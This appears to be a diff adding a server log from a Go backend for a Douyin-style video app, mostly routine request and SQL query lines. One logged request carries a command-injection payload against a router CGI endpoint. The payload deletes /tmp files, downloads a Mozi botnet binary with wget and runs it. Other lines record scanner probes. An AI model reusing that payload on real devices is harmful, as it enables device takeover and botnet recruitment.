+[GIN] 2022/05/23 - 10:54:41 | 200 |  126.566998ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:41 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.930ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:41 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.088ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:41 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.269ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:41 | 200 |  276.803708ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:42 | 200 |  738.966556ms |  210.41.103.169 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.100ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.867ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.337ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.085ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:42 | 200 |  138.122345ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[63.117ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[63.266ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:42 | 200 |  253.260764ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:42 | 200 |  504.335194ms |  210.41.103.169 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653274483321&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.344ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:42 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.975ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.253ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.911ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:43 | 200 |  138.129038ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[63.037ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[63.404ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:43 | 200 |  253.438625ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[240.647ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 10:54:43 | 200 |  240.857428ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653274483321&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN] 2022/05/23 - 10:54:43 | 200 |  590.946642ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.271ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.905ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.208ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.113ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:43 | 200 |  138.265743ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[63.248ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[63.543ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:43 | 200 |  253.756465ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:43 | 200 |  374.032362ms |  210.41.103.169 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.378ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:43 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.021ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[64.149ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:44 | 200 |  127.718295ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.033ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[68.944ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.194ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:44 | 200 |  276.519577ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653274484686&token=889871ff7dd0423b970e2e98b619bba9
+[GIN] 2022/05/23 - 10:54:44 | 200 |  331.821769ms |  210.41.103.169 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.179ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.918ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.000ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.973ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:44 | 200 |  138.051035ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[63.064ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[63.303ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:44 | 200 |  252.992242ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[206.264ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 10:54:44 | 200 |  206.435021ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653274484686&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN] 2022/05/23 - 10:54:44 | 200 |  295.523101ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.307ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.027ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.240ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.081ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:44 | 200 |  138.359681ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[63.105ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[63.211ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:44 | 200 |  253.280804ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:44 | 200 |  251.721873ms |  210.41.103.169 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.252ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.057ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.014ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:44 | 200 |  126.422922ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.084ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.040ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.160ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:45 | 200 |  276.709947ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653274485565&token=889871ff7dd0423b970e2e98b619bba9
+[GIN] 2022/05/23 - 10:54:45 | 200 |  265.944735ms |  210.41.103.169 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.214ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.985ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.158ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.899ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:45 | 200 |  138.063948ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[63.149ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[63.208ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:45 | 200 |  253.050042ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:45 | 200 |  241.057493ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.109ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.982ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[254.442ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 10:54:45 | 200 |  254.576313ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653274485565&token=889871ff7dd0423b970e2e98b619bba9"
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.034ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:45 | 200 |  126.411236ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.069ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[63.185ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:45 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[63.322ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:45 | 200 |  264.916351ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:46 | 200 |  924.397903ms |  210.41.103.169 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 10:54:46 | 206 |  372.831999ms |  210.41.103.169 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 11:11:36 | 404 |       1.121µs |   45.61.188.169 | GET      "/config/getuser?index=0"
+[GIN] 2022/05/23 - 11:14:02 | 404 |         381ns |  95.183.118.113 | GET      "/"
+[GIN] 2022/05/23 - 11:28:09 | 404 |         952ns |   78.108.177.53 | GET      "/"
+[GIN] 2022/05/23 - 11:48:46 | 404 |         900ns |   117.90.24.168 | GET      "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+2022/05/23 11:48:46 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
+[GIN] 2022/05/23 - 11:50:09 | 404 |         434ns |    8.219.71.118 | GET      "/"
+[GIN] 2022/05/23 - 11:58:36 | 404 |         530ns |     184.73.18.3 | GET      "/"
+[GIN] 2022/05/23 - 13:46:16 | 404 |         472ns |   117.213.8.254 | POST     "/GponForm/diag_Form?images/"
+[GIN] 2022/05/23 - 14:13:26 | 404 |       1.677µs |  179.43.167.122 | HEAD     "/"
+[GIN] 2022/05/23 - 14:16:12 | 404 |         766ns |   198.235.24.17 | GET      "/"
+[GIN] 2022/05/23 - 14:32:28 | 404 |       1.187µs |   23.251.102.74 | GET      "/"
+[GIN] 2022/05/23 - 15:22:40 | 404 |         594ns |    64.225.14.92 | GET      "/"
+[GIN] 2022/05/23 - 15:23:40 | 404 |       1.183µs | 192.241.207.244 | GET      "/manager/text/list"
+[GIN] 2022/05/23 - 16:01:33 | 404 |         949ns | 192.241.221.108 | GET      "/manager/html"
+[GIN] 2022/05/23 - 16:29:49 | 404 |         738ns |    159.65.64.54 | GET      "/"
+[GIN] 2022/05/23 - 16:48:11 | 404 |         965ns |  185.209.177.65 | GET      "/"
+[GIN] 2022/05/23 - 17:02:12 | 404 |       1.328µs |   167.94.138.44 | GET      "/"
+[GIN] 2022/05/23 - 17:02:13 | 404 |         742ns |   167.94.138.44 | GET      "/"
+[GIN] 2022/05/23 - 17:02:13 | 404 |         799ns |   167.94.138.44 | PRI      "*"
+[GIN] 2022/05/23 - 17:42:54 | 404 |         586ns |  118.123.105.85 | GET      "/"
+[GIN] 2022/05/23 - 17:43:00 | 404 |       1.085µs |     83.97.20.34 | GET      "/"
+[GIN] 2022/05/23 - 18:09:55 | 404 |       1.201µs |    8.219.71.118 | GET      "/"
+[GIN] 2022/05/23 - 18:11:30 | 404 |         800ns |   128.14.133.58 | GET      "/"
+[GIN] 2022/05/23 - 18:48:32 | 404 |         915ns |   85.117.69.203 | GET      "/"
+[GIN] 2022/05/23 - 19:12:27 | 404 |       1.306µs |   45.61.185.106 | GET      "/manager/html"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653305082568&token=889871ff7dd0423b970e2e98b619bba9
+[mysql] 2022/05/23 19:24:41 packets.go:123: closing bad idle connection: unexpected read from socket
+[mysql] 2022/05/23 19:24:41 packets.go:123: closing bad idle connection: unexpected read from socket
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[216.220ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 19:24:42 | 200 |  216.368339ms | 183.222.204.209 | GET      "/douyin/feed/?latest_time=1653305082568&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653305083138&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[36.308ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 19:24:42 | 200 |   36.486552ms | 183.222.204.209 | GET      "/douyin/feed/?latest_time=1653305083138&token=889871ff7dd0423b970e2e98b619bba9"
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[243.176ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[270.916ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.580ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 19:24:42 | 200 |  313.004811ms | 183.222.204.209 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[77.487ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.875ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 19:24:42 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.734ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 19:24:42 | 200 |  488.491357ms | 183.222.204.209 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 19:24:44 | 200 |   1.74319604s | 183.222.204.209 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:24:45 | 206 |  933.729413ms | 183.222.204.209 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:24:45 | 206 |   213.03099ms | 183.222.204.209 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:24:50 | 206 |  3.740734799s | 183.222.204.209 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:24:56 | 200 |  4.455814656s | 183.222.204.209 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 19:25:11 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.813ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 19:25:11 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[71.991ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 19:25:11 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.523ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 19:25:11 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.802ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 19:25:11 | 200 |  143.989941ms |    116.169.2.33 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 19:25:11 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.551ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 19:25:12 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.716ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 19:25:12 | 200 |  278.976168ms |    116.169.2.33 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 19:25:12 | 200 |  807.836072ms |    116.169.2.33 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 19:25:13 | 206 |  459.832805ms |    116.169.2.33 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 19:25:13 | 206 |  201.966878ms |    116.169.2.33 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/23 19:25:36 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
